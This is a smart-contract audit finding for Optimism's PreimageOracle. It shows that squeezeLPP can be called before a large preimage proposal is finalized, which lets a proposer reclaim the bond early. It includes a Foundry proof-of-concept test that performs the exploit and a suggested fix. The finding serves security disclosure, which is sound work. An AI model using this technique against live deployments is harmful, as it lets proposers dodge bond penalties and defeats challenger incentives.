# #19: The person who submits a large proposal can safely get their bond back at the beginning
Labels: ['bug', '3 (High Risk)', 'satisfactory', 'sufficient quality report', 'edited-by-warden', ':robot:_primary', 'duplicate-13']
Accepted: False

# Lines of code

https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L419
https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L605
https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L654
https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L657
https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L544
https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L791


# Vulnerability details

## Impact
When proposing a `large preimage`, `proposers` must provide `bonds`. 
These `bonds` can either be given to `challengers` during the `challenge period` or returned to the `proposer` if there are no `challenges`.
The `bonds` should not be returned to the `proposer` until the `challenge period` has ended. 
This is because the `bonds` act as an incentive for `challengers` to identify incorrect `proposals`.
However, if `proposers` can retrieve their `bonds` at any time, it removes the `incentive` for `challengers` to detect incorrect `proposals`, which poses a `high impact` and is very likely to happen.
## Proof of Concept
When `proposers` want to submit a new `large preimage`, they must provide a predefined `bond`. 
```
function initLPP(uint256 _uuid, uint32 _partOffset, uint32 _claimedSize) external payable {
    if (msg.value < MIN_BOND_SIZE) revert InsufficientBond();  // @audit, here
    ...
    proposalBonds[msg.sender][_uuid] = msg.value;
}
```
If `challengers` find incorrect commitments, the `bond` is sent to the `challengers`. 
```
function challengeLPP(
    address _claimant,
    uint256 _uuid,
    LibKeccak.StateMatrix memory _stateMatrix,
    Leaf calldata _preState,
    bytes32[] calldata _preStateProof,
    Leaf calldata _postState,
    bytes32[] calldata _postStateProof
)
    external
{
    ...
    // Mark the keccak claim as countered.
    proposalMetadata[_claimant][_uuid] = proposalMetadata[_claimant][_uuid].setCountered(true);  

    // Pay out the bond to the challenger.
    _payoutBond(_claimant, _uuid, msg.sender); // @audit, here
}
```
And `proposers` cannot `squeeze` their `proposals`. 
```
function squeezeLPP(
    address _claimant,
    uint256 _uuid,
    LibKeccak.StateMatrix memory _stateMatrix,
    Leaf calldata _preState,
    bytes32[] calldata _preStateProof,
    Leaf calldata _postState,
    bytes32[] calldata _postStateProof
)
    external
{
    LPPMetaData metaData = proposalMetadata[_claimant][_uuid];

    // Check if the proposal was countered.
    if (metaData.countered()) revert BadProposal(); // @audit, here
}
```
As a result, `proposers` risk losing their funds if their `proposals` are incorrect, which discourages `bad proposals`.

Therefore, it is mandatory to keep the `proposers' bonds` until the `challenge period` ends. 
This is enforced by a check in the `squeezeLPP` function like below.
```
function squeezeLPP(
    address _claimant,
    uint256 _uuid,
    LibKeccak.StateMatrix memory _stateMatrix,
    Leaf calldata _preState,
    bytes32[] calldata _preStateProof,
    Leaf calldata _postState,
    bytes32[] calldata _postStateProof
)
    external
{
    LPPMetaData metaData = proposalMetadata[_claimant][_uuid];
    // Check if the proposal was countered.
    if (metaData.countered()) revert BadProposal();
    // Check if the challenge period has passed since the proposal was finalized.
    if (block.timestamp - metaData.timestamp() <= CHALLENGE_PERIOD) revert ActiveProposal(); // @audit, here
}
```
However, this check is incorrect before the `proposal` is finalized, meaning it will always pass when `metaData.timestamp()` is `0`. 
This value is set when the `proposal` is finalized.
```
function addLeavesLPP(
    uint256 _uuid,
    uint256 _inputStartBlock,
    bytes calldata _input,
    bytes32[] calldata _stateCommitments,
    bool _finalize
)
    external
{
    ...
    if (_finalize) {
        metaData = metaData.setTimestamp(uint64(block.timestamp));  // @audit, here
    }
}
```

This means `proposers` can submit correct first 2 parts of the `proposal`, call this `squeezeLPP` function to retrieve their `bonds`, and then propose any data afterward, because they have already retrieved their `bonds`. 
```
function _payoutBond(address _claimant, uint256 _uuid, address _to) internal {
    uint256 bond = proposalBonds[_claimant][_uuid];
    proposalBonds[_claimant][_uuid] = 0;
    (bool success,) = _to.call{ value: bond }("");
    if (!success) revert BondTransferFailed();
}
```
Consequently, honest `challengers` do not receive any incentives even if they detect incorrect commitments.

Please add below test to the `test/cannon/PreimageOracle.t.sol` and run `forge test --mt test_squeeze_retrieve_bond --via-ir  -vvv`:
```
function test_squeeze_retrieve_bond() public {

    vm.warp(100000000000);

    // Want to propose 3 blocks (136 * 3 = 408)
    bytes memory data = new bytes(408);
    for (uint256 i; i < data.length; i++) {
        data[i] = 0xFF;
    }

    // Initialize the proposal.
    oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 0, uint32(data.length));

    // Add the leaves to the tree (2 keccak blocks.)
    LibKeccak.StateMatrix memory stateMatrix;
    bytes32[] memory stateCommitments = _generateStateCommitments(stateMatrix, data);

    bytes memory data_0 = Bytes.slice(data, 0, 136);
    bytes32[] memory stateCommitments_0 = new bytes32[](1);
    stateCommitments_0[0] = stateCommitments[0];
    // Submit first block (136 bytes)
    oracle.addLeavesLPP(TEST_UUID, 0, data_0, stateCommitments_0, false);

    bytes memory data_1 = Bytes.slice(data, 136, 136);
    bytes32[] memory stateCommitments_1 = new bytes32[](1);
    stateCommitments_1[0] = stateCommitments[1];
    // Submit second block (136 bytes)
    oracle.addLeavesLPP(TEST_UUID, 1, data_1, stateCommitments_1, false);

    // Construct the leaf preimage data for the blocks added.
    LibKeccak.StateMatrix memory matrix;
    PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, data);

    // Create a proof array with 16 elements.
    bytes32[] memory preProof = new bytes32[](16);
    preProof[0] = _hashLeaf(leaves[1]);
    bytes32[] memory postProof = new bytes32[](16);
    postProof[0] = _hashLeaf(leaves[0]);
    for (uint256 i = 1; i < preProof.length; i++) {
        bytes32 zeroHash = oracle.zeroHashes(i);
        preProof[i] = zeroHash;
        postProof[i] = zeroHash;
    }

    uint256 balanceBefore = address(this).balance;
    // Call squeezeLPP function before finalizing the proposal
    oracle.squeezeLPP({
        _claimant: address(this),
        _uuid: TEST_UUID,
        _stateMatrix: _stateMatrixAtBlockIndex(data, 1),
        _preState: leaves[0],
        _preStateProof: preProof,
        _postState: leaves[1],
        _postStateProof: postProof
    });
    // Successfully retrieve the bond
    assertEq(address(this).balance, balanceBefore + oracle.MIN_BOND_SIZE());
}
```
## Tools Used

## Recommended Mitigation Steps
Prevent `proposals` from being squeezed before they are finalized.
```
function squeezeLPP(
    address _claimant,
    uint256 _uuid,
    LibKeccak.StateMatrix memory _stateMatrix,
    Leaf calldata _preState,
    bytes32[] calldata _preStateProof,
    Leaf calldata _postState,
    bytes32[] calldata _postStateProof
)
    external
{
    LPPMetaData metaData = proposalMetadata[_claimant][_uuid];
    // Check if the proposal was countered.
    if (metaData.countered()) revert BadProposal();

+    if (metaData.timestamp() == 0) revert();

    // Check if the challenge period has passed since the proposal was finalized.
    if (block.timestamp - metaData.timestamp() <= CHALLENGE_PERIOD) revert ActiveProposal(); // @audit, here
}
```








## Assessed type

Invalid Validation